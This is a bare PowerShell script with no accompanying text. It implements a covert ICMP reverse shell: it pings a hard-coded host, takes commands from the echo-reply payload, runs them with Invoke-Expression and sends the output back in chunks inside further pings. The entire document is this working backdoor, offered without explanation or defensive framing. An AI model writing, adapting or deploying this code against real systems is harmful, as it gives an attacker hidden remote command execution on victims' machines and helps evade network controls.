$ip='10.10.10.10'
$id='1000'
$ic=New-Object System.Net.NetworkInformation.Ping
$po=New-Object System.Net.NetworkInformation.PingOptions
$po.DontFragment=$true
function s($b){$ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po)}
function p {-join($id,'[P$]> ')};while ($true){$r=s(p);if (!$r.Buffer) {continue;}
$rs=([text.encoding]::ASCII).GetString($r.Buffer)
if ($rs.Substring(0,8) -ne $id) {exit}
try {$rt=(iex -Command $rs.Substring(8) | Out-String)}catch {$rt=($_.Exception|Out-String)}
$i=0
while ($i -lt $rt.length-110){
    s(-join($id,$rt.Substring($i,110)));$i -= -110}s(-join($id,$rt.Substring($i)))
}